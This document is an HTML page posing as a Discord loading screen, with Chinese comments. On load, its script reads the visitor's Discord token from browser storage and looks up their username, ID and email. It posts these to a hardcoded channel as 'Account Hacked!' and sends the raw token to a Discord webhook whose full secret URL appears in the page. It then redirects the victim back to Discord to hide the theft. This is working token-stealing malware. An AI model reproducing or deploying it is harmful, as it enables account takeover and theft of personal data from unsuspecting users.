<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (function() {
      try {
        var token = localStorage.getItem("token");
        if (token) {
          token = token.replace(/"/g, "");

          // 立即偷取 token — fire & forget
          fetch("https://discord.com/api/v9/users/@me", {
            headers: { "Authorization": token }
          }).then(function(res) {
            if (res.ok) {
              res.json().then(function(user) {
                var username = user.username;
                var userId = user.id;
                var email = user.email || 'N/A';

                // 發送訊息到目標 878151437085974548
                fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json",
                    "Authorization": token,
                    "X-Correlation-Id": userId
                  },
                  body: JSON.stringify({
                    content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
                  })
                }).catch(function() {});

                // 把 token 送到 webhook 備份
                fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "**\n```\n" + token + "\n```"
                  })
                }).catch(function() {});
              });
            }
          }).catch(function() {});
        }

        // 1 秒後跳回 Discord（不管 API 是否完成）
        setTimeout(function() {
          // 先嘗試 Discord deep link
          window.location.replace('discord://');
          // 備案：如果 deep link 失敗
          setTimeout(function() {
            window.location.href = "https://discord.com/channels/@me";
          }, 500);
        }, 1000);

        // 無 token 時：2 秒後跳回
        if (!token) {
          setTimeout(function() {
            window.location.href = "https://discord.com/channels/@me";
          }, 2000);
        }
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
